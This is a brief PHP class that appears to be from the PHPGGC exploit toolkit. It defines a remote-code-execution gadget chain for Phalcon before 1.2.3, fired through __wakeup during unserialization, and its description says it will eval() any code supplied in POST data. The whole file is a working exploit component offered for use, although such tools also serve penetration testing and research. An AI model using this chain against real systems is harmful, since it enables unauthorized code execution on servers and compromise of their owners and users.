<?php

namespace GadgetChain\Phalcon;

class RCE extends \PHPGGC\GadgetChain\RCE
{
    public $version = '< 1.2.3';
    public $vector = '__wakeup';
    public $author = 'Raz0r';
    public $informations =  'This chain does not expect parameters, will eval()' .
                            ' any code supplied in php://input (i.e. POST data)';

    public function generate(array $parameters)
    {
        return new \Phalcon\Logger\Adapter\File();
    }
}
